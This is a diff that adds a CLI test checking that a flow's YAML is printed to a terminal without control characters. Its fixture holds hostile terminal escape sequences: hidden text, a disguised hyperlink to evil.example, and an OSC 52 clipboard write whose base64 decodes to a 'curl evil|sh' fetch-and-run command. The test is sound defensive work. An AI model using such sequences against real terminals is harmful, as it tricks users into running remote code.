@@ -163,6 +163,17 @@ describe("server strings in human lines", () => {
 });
 
 describe("telflo flows pull", () => {
+  const STORED_WITH_ESCAPES = "receivers: {}\n# \u001b[8mhidden\u001b[0m \u001b]8;;https://evil.example\u0007link\u001b]8;;\u0007 \u001b]52;c;Y3VybCBldmlsfHNo\u0007\nexporters:\n\tdebug: {}\n";
+
+  it("prints a flow's YAML to a terminal without its control characters, byte for byte to a pipe", async () => {
+    routes({ "GET /flows/otel-to-clickstack": { json: { ...DETAIL, yaml: STORED_WITH_ESCAPES } } });
+    const shown = await cli(["flows", "pull", "otel-to-clickstack"], { stdoutTty: true });
+    expect(holdsControl(shown.stdout.replaceAll("\t", ""))).toBe(false);
+    expect(shown.stdout).toContain("\nexporters:\n\tdebug: {}\n");
+    const piped = await cli(["flows", "pull", "otel-to-clickstack"]);
+    expect(piped.stdout).toBe(STORED_WITH_ESCAPES);
+  });
+
   it("prints the YAML, ending in a newline", async () => {
     routes({ "GET /flows/otel-to-clickstack": { json: DETAIL } });
     const result = await cli(["flows", "pull", "otel-to-clickstack"]);
